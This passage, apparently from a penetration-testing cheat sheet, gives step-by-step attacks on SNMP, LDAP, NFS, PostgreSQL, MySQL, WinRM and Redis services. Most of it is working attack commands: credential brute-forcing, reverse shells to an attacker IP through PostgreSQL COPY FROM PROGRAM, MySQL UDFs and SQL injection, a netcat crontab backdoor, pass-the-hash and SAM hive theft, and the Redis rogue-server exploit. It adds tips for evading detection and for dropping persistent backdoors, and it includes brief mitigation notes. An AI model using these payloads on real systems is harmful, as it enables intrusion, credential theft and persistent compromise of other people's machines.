7. Metasploit - snmp_enum
bash

    use auxiliary/scanner/snmp/snmp_enum
    set RHOSTS <target-ip>
    set community public
    run
8. Hydra
bash

       hydra -P pass.txt <target-ip> snmp
-P: Password list (community strings)

9. Metasploit - snmp_login
bash

       use auxiliary/scanner/snmp/snmp_login
       set RHOSTS <target-ip>
       set PASS_FILE pass.txt
       run
10. Medusa
bash

        medusa -h <target-ip> -P pass.txt -M snmp
11. Patator
bash

        patator SNMP_login host=<target-ip> community=FILE0 0=pass.txt
12. Nmap NSE Script
bash

        nmap -sU -p 161 <target-ip> --script snmp-brute --script-args snmp-brute.communitiesdb=pass.txt
13. Onesixtyone
bash

        onesixtyone -c pass.txt <target-ip>
Simple and efficient brute-force tool.

🧾 Useful Resources
Common SNMP Community Strings Wordlist:
fuzzdb SNMP wordlist[https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/wordlists-misc/wordlist-common-snmp-community-strings.txt]

Extended MIB Enumeration:
Explore additional SNMP fields via extended MIBs
NET-SNMP-EXTEND-MIB[https://circitor.fr/]

🛠️ Tips for Red Teamers & Pentesters
SNMP Read-Only (RO) can leak:

Usernames and services

System details

Running processes

Network interfaces

Potential credentials (sometimes encoded or plaintext)

SNMP Read-Write (RW) access is highly critical:

Can change configurations

Reboot devices

Inject malicious configuration (e.g., redirect logs, change SNMP traps)

Use snmp-check and braa for fast reconnaissance, then deep dive with snmpwalk or Metasploit.

SNMP often reveals network topology and firewall rules via MIBs.
https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp/snmp-rce

</details>

<details>
<summary>10.📚 LDAP (Lightweight Directory Access Protocol)389,636</summary>
 <br>
LDAP is a protocol used to access and maintain directory information. It is commonly used for managing user information and authentication.

**Enumerating LDAP:**

```bash

ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.

ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
#CN name describes the info we're collecting
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

#windapsearch.py
#for computers
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers

#for groups
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups

#for users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da

#for privileged users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users

```

You can also enumerate users and gather information from LDAP directories.

**Using Metasploit for LDAP enumeration:**

```bash

msfconsole
use auxiliary/gather/ldap_query
set RHOSTS <IP>
set BASE "dc=example,dc=com"
run

```

</details>
<details>
<summary>11.📦 NFS (Network File System) port 2049</summary>
 <br>
NFS allows a system to share its files with other systems over a network. It enables the mounting of remote file systems and interaction with them as if they were local.

**Example Nmap command to scan for NFS services:**

```bash

nmap -p2049 -sV 192.168.188.131

```

If NFS is exposed publicly, it can be mounted to the local machine and files can be accessed.

**Mounting NFS share:**

```bash

sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock

```

This allows you to access shared files from the remote NFS server.
![image](https://github.com/user-attachments/assets/34ad4003-778a-4011-b5ee-1c63e17adf4a)

**Troubleshooting NFS Mount Permission Issues:**

If you encounter **Permission Denied**, ensure that you have the correct NFS version and permissions configured.
https://blog.christophetd.fr/write-up-vulnix/
**To use NFSv3 (if needed):**

```bash

sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock

```
Let’s take a closer look at the permissions. 
```bash
ls -ld vulnix
```
If only Particuler user or group have access to the Path:
create a user group:
```jsx
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --groups vulnix_group vulnix
sudo -u vulnix ls -l vulnix
```

![image](https://github.com/user-attachments/assets/c5978efc-c909-48b1-8165-5705d484ef0a)


DEBUG

```jsx
id vulnix
```

Ensure it outputs:

```jsx
uid=2008(vulnix) gid=2008(vulnix_group) groups=2008(vulnix_group)
```

If the UID or GID is incorrect, you must delete and recreate the user with:

```jsx
sudo userdel vulnix
sudo groupdel vulnix_group
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --gid 2008 --groups vulnix_group vulnix
```

Now, try accessing the directory as `vulnix_user`:
![image](https://github.com/user-attachments/assets/90546368-1291-4e7a-b7c9-52a148eef779)

</details>


<details>
<summary>12. PostgreSQL 5432</summary>
 <br>
 PostgreSQL, also known as Postgres, is an advanced open-source relational database used across major platforms (Linux, Windows, Mac). It ships by default with macOS and is often used in enterprise backends.

PostgreSQL includes powerful functionality such as user-defined functions, server-side programming, and even the ability to execute system commands — which, when misconfigured, becomes a privilege escalation or RCE vector.

🎯 Attack Goals
Gain remote shell access

Escalate privileges (via SYSTEM/root or postgres user)

Lateral movement within internal networks

🧪 Step-by-Step Exploitation
🔐 Step 1: Brute-force PostgreSQL Credentials (if creds not known)
bash

    hydra -L /usr/share/wordlists/metasploit/postgres_default_user.txt \ -P /usr/share/wordlists/metasploit/postgres_default_pass.txt \ <target-ip> postgres
👉 This attempts default user:pass combinations like postgres:postgres.

📥 Step 2: Log in with psql or Metasploit module
bash

    psql -h <target-ip> -U postgres
or via Metasploit:

bash

    use auxiliary/scanner/postgres/postgres_login
☠️ Step 3: Confirm Privileges (Key Requirement!)
This RCE works only if:

The user is superuser or

The user has pg_execute_server_program role

Check roles:

sql

    \du
Look for:

pgsql

    postgres | Superuser, Create role, Create DB, Replication, Bypass RLS
or:

      https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767
sql

    SELECT usesuper, usename FROM pg_user;
💥 Step 4: Achieve Code Execution via COPY FROM PROGRAM
This PostgreSQL feature allows importing data from an OS command.

Example: Windows Reverse Shell (PowerShell)
sql

    CREATE TABLE cmd_out(data text);
    COPY cmd_out FROM PROGRAM 'powershell -EncodedCommand <Base64Payload>';
👉 Base64Payload is your reverse shell (msfvenom -p windows/x64/powershell_reverse_tcp)

Linux Example:
sql

    COPY cmd_out FROM PROGRAM '/bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1"';
🛠 Tools to generate shell payloads:

bash

    msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw
🛠️ Alternative Methods of Exploitation
1. User-Defined Functions (UDF) via Shared Object Libraries
Upload a malicious .so (Linux) or .dll (Windows) and load it using:

sql

    CREATE FUNCTION sys_exec(text) RETURNS int
    AS '/tmp/malicious.so', 'exec'
    LANGUAGE C STRICT;
    SELECT sys_exec('nc -e /bin/bash <attacker-ip> <port>');
Requires superuser privileges and shared_preload_libraries.

2. Writable Filesystem Abuse
Check writable paths:

sql

    COPY cmd_out TO '/tmp/test.txt';
If successful, you can:

Write malicious scripts
Drop cron jobs (Linux)
Schedule tasks (Windows)

3. SQL Injection in Web Applications
If PostgreSQL is the backend and the app is vulnerable to SQLi:

sql

    '; COPY cmd_out FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"' --
Useful if you don’t have creds but have SQLi in a web app.

🧼 Cleanup (Optional)
sql

    DROP TABLE cmd_out;
🔒 Detection & Mitigation
Defense Area	Recommendation
🔐 Privilege Restriction	Avoid granting pg_execute_server_program or superuser to non-admin users
🔍 Logging	Enable query logging: log_statement = 'all'
🛡️ Disable COPY PROGRAM	Use PostgreSQL --disable-copy-program or AppArmor/SELinux
📦 Application Security	Sanitize SQL inputs to prevent injection
🔑 Credential Hygiene	Avoid default credentials and enforce strong auth
🔁 Regular Audits	Monitor user roles (\du) and extensions (\dx)

📌 Summary
Stage	Command
Brute Force	hydra -L ... -P ... <ip> postgres
Check Privs	\du or SELECT usesuper FROM pg_user;
Reverse Shell	COPY ... FROM PROGRAM 'bash ...'
UDF Execution	CREATE FUNCTION ... with .so/.dll
SQLi RCE	Inject COPY command via vulnerable web app

📎 Reference
https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
Greenwolf Security – PostgreSQL RCE via COPY

Metasploit Modules

exploit/multi/postgres/postgres_copy_from_program_cmd_exec

exploit/windows/postgres/postgres_payload
</details>
<details>
<summary>13. MYSQL Port 3306</summary>
 <br>
🔎 Step 1: Enumeration
Start with identifying whether port 3306 (default MySQL port) is open:

bash

    nmap -p3306 -sV -sC <target-ip>
Add aggressive scanning options for version detection and default script scans:

bash

    nmap -p3306 --script mysql* -sV <target-ip>
This will also try:

Default creds

Enumerate MySQL users

Check for anonymous access

🔑 Step 2: Brute Forcing MySQL Credentials
bash

    hydra -L users.txt -P pass.txt <ip> mysql
Alternatively, you can use medusa:

bash

    medusa -h <ip> -u root -P pass.txt -M mysql
Or use ncrack (especially good for fast brute-forcing):

bash

    ncrack -p 3306 -U users.txt -P pass.txt <ip>
🧠 Step 3: Manual Login (Once Valid Credentials Are Found)
bash

    mysql -h <ip> -u <user> -p
Once logged in, you can:

List databases: show databases;

Use a DB: use mysql;

Check users: select user, host, authentication_string from mysql.user;

⚡ Step 4: Exploitation via Metasploit
A. Run SQL Queries Directly
bash

    msfconsole -q
    use auxiliary/admin/mysql/mysql_sql
    set rhosts <target-ip>
    set username <user>
    set password <pass>
    set sql show databases;
    run
B. Dump Password Hashes
bash

    use auxiliary/scanner/mysql/mysql_hashdump
    set rhosts <target-ip>
    set username <user>
    set password <pass>
    run
C. Run Commands via UDF (User Defined Function) Injection (for RCE)
bash

    use exploit/windows/mysql/mysql_udf_payload
    set rhosts <target-ip>
    set username root
    set password toor
    set payload windows/meterpreter/reverse_tcp
    set lhost <attacker-ip>
    set lport 4444
    run
✅ This exploit creates a custom function using a shared library (.dll or .so) and then calls it through SQL to gain RCE.

🧪 Step 5: Manual RCE via User-Defined Functions (UDF)
If file_priv is granted, you can:

Upload a malicious .dll or .so UDF file.

Register it with SQL:

sql

    CREATE FUNCTION do_system RETURNS integer SONAME 'lib_mysqludf_sys.so';
    SELECT do_system('nc <attacker-ip> 4444 -e /bin/bash');
On Windows:

sql

    SELECT do_system('powershell -c <reverse_shell_payload>');
🪵 Step 6: Post Exploitation
Dump user tables:

sql

    select user, password from mysql.user;
Look for saved credentials or tokens in application databases

Exfiltrate configuration files, secrets, keys

🛡️ Detection & Mitigation
Disable root login from remote IPs (bind-address=127.0.0.1 in my.cnf)

Enforce strong passwords and remove default credentials

Regularly audit MySQL users and their privileges

Monitor for signs of brute-force (slow query logs, login failures)

Consider enabling TLS encryption for connections

Use MySQL roles to minimize privilege exposure

🔁 Alternatives Tools for MySQL Pentesting
Tool	Purpose
sqlmap	Exploit SQL injection vulnerabilities
mysql_enum (NSE Script)	MySQL database enumeration
DBPwAudit	Fast credential bruteforcer
mariadb-client	Compatible client for login and testing
Metasploit	Multiple auxiliary and exploit modules

🧷 Additional Notes
MySQL with misconfigured permissions (e.g., file_priv, secure_file_priv) allows file upload or command execution

Some versions allow writing to crontab via SELECT ... INTO OUTFILE if not locked down

sql

    SELECT '*/1 * * * * root nc <ip> 4444 -e /bin/bash' INTO OUTFILE '/etc/cron.d/mysqlbackdoor';

</details>

<details>
<summary>14. WinRM 5985</summary>
 <br>
📌 What is WinRM?
Windows Remote Management (WinRM) is Microsoft’s implementation of the WS-Management protocol based on SOAP. It allows remote management of Windows systems and is enabled by default in some environments.

Port 5985 → WinRM over HTTP (unencrypted unless message-level encryption is used)

Port 5986 → WinRM over HTTPS (encrypted)

🔎 Initial Enumeration
Check if WinRM is exposed:

bash

    nmap -p 5985,5986 -sV -Pn <target-ip> --script http-winrm*
Use nmap with WinRM-specific NSE scripts:

bash

    nmap -p5985 --script=winrm-auth <target-ip>
Or check manually using curl:

bash

    curl -s -X POST http://<ip>:5985/wsman
If the response contains wsman, the service is alive.

🧪 Metasploit Enumeration
Check for Supported Auth Methods:
bash

    msfconsole
    use auxiliary/scanner/winrm/winrm_auth_methods
    set RHOSTS <target-ip>
    run
🔐 Brute-Force WinRM Credentials
1. Metasploit Module
bash

       use auxiliary/scanner/winrm/winrm_login
       set RHOSTS <target-ip>
       set user_file users.txt
       set pass_file passwords.txt
       set DOMAIN WORKSTATION
       run
2. Password Spray with nxc (lightweight & fast):
bash

       nxc winrm <ip> -u users.txt -p passwords.txt
🧠 Remote Shell with Valid Credentials
1. evil-winrm (Preferred Tool)
bash

       evil-winrm -i <target-ip> -u <user> -p <password>
Supports:

Upload/download
Powershell scripting
Proxy support
Kerberos & pass-the-hash (see below)

2. Docker Evil-WinRM (for Linux users)
bash

       docker run -it --rm --name evil-winrm --entrypoint evil-winrm oscarakaelvis/evil-winrm -i <ip> -u <user> -p <password>
🧪 Alternative Shells
1. PowerShell Remoting (Linux to Windows)
Using PowerShell NTLM Docker:

bash

    docker run -it quickbreach/powershell-ntlm
    $creds = Get-Credential
    Enter-PSSession -ComputerName <ip> -Authentication Negotiate -Credential $creds
2. Ruby WinRM Shell Script
Download & configure this Ruby script:

bash

    wget https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell_with_upload.rb
    nano winrm_shell_with_upload.rb  # Set IP, creds
    ruby winrm_shell_with_upload.rb
3. Powershell Empire / Covenant
You can use tools like:

Empire

Covenant

PSSharp
To execute WinRM-based agents if lateral movement or persistent C2 is required.

🧯 Pass-the-Hash with Evil-WinRM
If you have an NTLM hash, use:

bash

    evil-winrm -i <target-ip> -u <user> -H <NTLM_hash>
Or use Impacket's wmiexec.py or psexec.py as alternatives.

🔁 Lateral Movement
If you compromise a user with WinRM access on other systems:

bash

    evil-winrm -i <target-2> -u compromised_user -p password
Or use built-in PS remoting:

powershell

    Invoke-Command -ComputerName target2 -ScriptBlock { whoami } -Credential (Get-Credential)
📤 Post Exploitation with Evil-WinRM
bash

    upload <local-file> C:\Users\Public\payload.exe
    download C:\Windows\System32\config\SAM
    scripts
Built-in modules:

BloodHound
PowerView
SharpHound
PowerUp

🕵️ Detection Evasion Tips
Avoid brute-force from same IP: use --proxy or TOR routing

Disable PowerShell logging where possible

Modify Evil-WinRM user-agent string if using HTTPS

Consider using Kerberos authentication to reduce logs (with --auth kerberos)

🛡️ Defensive Notes / Mitigations
Disable WinRM if not needed:

powershell

    Disable-PSRemoting -Force
Use HTTPS + Cert-based Auth if enabled

Enable logging (Microsoft-Windows-WinRM/Operational)

Use GPO to restrict which users can access via WinRM

Monitor for new evil-winrm.exe or PS remoting activity

Limit "Remote Management Users" group

🧰 Related Tools Summary
Tool	Use
evil-winrm	Remote PS shell
nxc	Fast password spray
crackmapexec	SMB/WinRM enumeration
PSRemoting	Native method
Impacket	Pass-the-hash over WinRM (via SMB/WMI/PSEXEC)
wmiexec.py	WMI exec using hashes
pywinrm	Python-based WinRM library
Metasploit	Brute-force, auth check

</details>
<details>
<summary>15. redis</summary>
 <br>
Redis Basics
Default Port: 6379/TCP (but can also run on other ports)
 
    https://github.com/n0b0dyCN/redis-rogue-server
Default Auth: None (older versions) → Newer versions require password if configured in redis.conf

Service Purpose: In-memory key-value database, often used for caching.

Danger: If exposed to the internet without authentication, it can be used for:

Data theft

RCE via module loading

Persistence (cron jobs, SSH keys)

Privilege escalation (local)

2️⃣ Enumeration
Check if Redis is open
bash

nmap -p 6379 --script redis-info <target>
Example output will show:

Redis version

Role (master/slave)

OS info

Config parameters

Connect to Redis
bash

redis-cli -h <IP> -p 6379
If password required:

bash

    ./redis-rogue-server.py --rhost <MIP> --lhost <VIP> --lport=6379 --exp exp.so

to get the shell type r and then enter your Vpn-IP and port and start Netcat on the same port sudo rlwrap -cAr nc -lvnp port

redis-cli -h <IP> -p 6379 -a <password>
Gather Information
Inside redis-cli:

redis

INFO           # Shows server, clients, memory, persistence, stats, replication, CPU, cluster, keyspace
CONFIG GET *   # View all configuration parameters
KEYS *         # List all keys
GET <keyname>  # Get value for a key
Bruteforce Password
bash

medusa -h <IP> -u "" -P /usr/share/wordlists/rockyou.txt -M redis
or

bash

hydra -P rockyou.txt redis://<IP>

for exploit try :

    https://github.com/n0b0dyCN/redis-rogue-server?tab=readme-ov-file
founf few issues and added few thing to get the .so file

Fix Radis Debug:
add the following 

    #include <string.h>     // For strlen, strcat
    #include <arpa/inet.h>  // For inet_addr

or use alternat payload: https://github.com/Ridter/redis-rce
 </details>
 <details>
<summary>Debug </summary>
 <br>
 step-by-step cleanup-and-retry procedure for the redis-rogue-server exploit so you can re-run it reliably without getting stuck in the “taking too long” state.

Step 1 – Connect to Redis
From your attacking box:

bash

redis-cli -h <target_ip> -p 6379
(If the Redis server uses a password, add -a <password>.)

Step 2 – Check for loaded modules
redis

MODULE LIST
Look for something like:

arduino

1) 1) "name"
   2) "system"
   3) "ver"
   4) "1.0"
If "system" (or your rogue module name) is there, unload it:

redis

MODULE UNLOAD system
Step 3 – Reset modified config
The exploit usually changes:

dir (where the module is saved)

dbfilename (filename of module file)

Check them:

r

CONFIG GET dir
CONFIG GET dbfilename
Reset to defaults (often /var/lib/redis and dump.rdb):

redis

CONFIG SET dir /var/lib/redis
CONFIG SET dbfilename dump.rdb
Step 4 – Remove leftover module files
If you still have shell access (via reverse shell or RCE), delete the .so file the exploit uploaded.
Common paths:

bash

rm -f /var/lib/redis/*.so
rm -f /tmp/*.so
(Paths depend on where the exploit dropped the file — check CONFIG GET dir if unsure.)

Step 5 – Restart Redis (if possible)
If you control the machine or have root:

bash

systemctl restart redis
If not, at least ensure the rogue module is unloaded (Step 2) and config is reset (Step 3).

Step 6 – Kill stuck rogue-server process on your machine
Sometimes your local rogue-server process is still running and blocking the port:

bash

ps aux | grep redis-rogue-server
kill -9 <PID>
Step 7 – Re-run the exploit cleanly
Start fresh:

bash

./redis-rogue-server.py --rhost <target_ip> --lhost <your_ip> --lport 4443
When prompted, pick reverse shell instead of interactive — it’s more stable.

Once you get the shell, immediately:

Upgrade it to a full TTY:

bash

python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
Drop a persistent backdoor (SSH key, netcat listener, etc.).

Step 8 – Verify before retrying in the future
If it fails in the future, check:

bash

redis-cli -h <target_ip> MODULE LIST
If system is present → unload & reset config before retrying.
</details>
